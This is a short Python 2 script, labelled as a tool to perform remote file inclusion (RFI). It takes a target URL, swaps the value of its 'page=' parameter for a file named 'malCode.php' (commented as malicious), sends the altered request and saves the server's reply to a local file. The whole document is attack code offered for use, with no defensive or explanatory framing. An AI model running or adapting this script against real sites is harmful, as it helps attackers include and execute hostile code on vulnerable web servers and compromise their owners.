
# SCRIPT TO PERFORM RFI

import urllib
import urllib2

#function to find index of the last character of file name in url
def findend(mainurl,suburl,pgind):
    j=pgind
    for i in suburl:
        if(i=='&'):
            end = suburl.index(i)       
            return end
           
        if(j==len(mainurl)):
            end = j        
            return end
        j+=1
   
try:
    data = {}
    urlInput = raw_input(" enter url ")
      
    malfile='malCode.php'  #malicious url
    
    # obtaining indices of start and end of file name in url
    startIndex = urlInput.index('page=')
    startIndex+=5
    suburlInput = urlInput[startIndex:]
    endIndex= findend(urlInput,suburlInput,startIndex)
    
    #replacing the file name with url of pur choice
    urlInput=urlInput.replace(urlInput[startIndex:endIndex],malfile)
    
    #accessing returned contents and storing in a file
    data = urllib2.urlopen(urlInput)
    sfile = open('/home/raj/Desktop/returned.txt','w')
    sfile.write(str(data.read()))
    sfile.close()

except Exception as e:
    print(str(e))


























      
        
    

